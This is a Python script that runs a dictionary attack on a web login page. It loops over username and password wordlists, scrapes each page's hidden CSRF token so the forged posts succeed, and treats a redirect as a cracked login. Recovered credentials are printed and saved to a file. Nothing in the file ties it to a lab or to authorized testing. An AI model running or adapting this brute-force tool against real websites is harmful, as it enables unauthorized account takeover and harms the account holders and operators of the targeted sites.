import requests
from bs4 import BeautifulSoup
from tools.helper import save_result_as_text_file
import config as Config

Data_Dict = {}
Account = []
User_List_File = open(Config.Username_List_Path, 'r', encoding='utf8').readlines()
Password_List_File = open(Config.Password_List_Path, 'r', encoding='utf8').readlines()

# Dictionary Attack
def Dictionary_Attack():
    User_Counter = 1
    for single_user in User_List_File:
        test_user = single_user.strip()
        Data_Dict[Config.Input_Name] = test_user
        Try_Password(username=single_user, user_counter=User_Counter)
        User_Counter += 1
        if Account:
            break
    # check account
    if Account:
        print(Account)
        print(f"{Account[0].strip()}")
        print(f"{Account[1]}")
        save_result_as_text_file(Account, method="Dictionary_Attack")
    else:
        print("Account not Found")

# Try Password
def Try_Password(username, user_counter):
    Password_Counter = 1
    for single_password in Password_List_File:
        session = requests.session()
        content = session.get(Config.Target_Login_URL)
        soup = BeautifulSoup(content.content, "html.parser")
        CSRF_Token = soup.find("input", type="hidden")
        submit = soup.find("input", type="submit").attrs['name']
        hidden_name = CSRF_Token.attrs["name"]
        test_password = single_password.strip()
        Data_Dict[Config.Input_Password] = test_password
        Data_Dict[hidden_name] = CSRF_Token.attrs["value"]
        Data_Dict[submit] = 'submit'
        response = session.post(Config.Target_Login_URL, data=Data_Dict)
        print(f"Dictionary_Attack Status: -> User {user_counter}/{len(User_List_File)} | Password {Password_Counter}/{len(Password_List_File)} <-")
        Password_Counter +=1
        # check url
        if response.url != Config.Target_Login_URL:
            Account.append('Accountname: '+ username)
            Account.append('Password: ' + test_password)
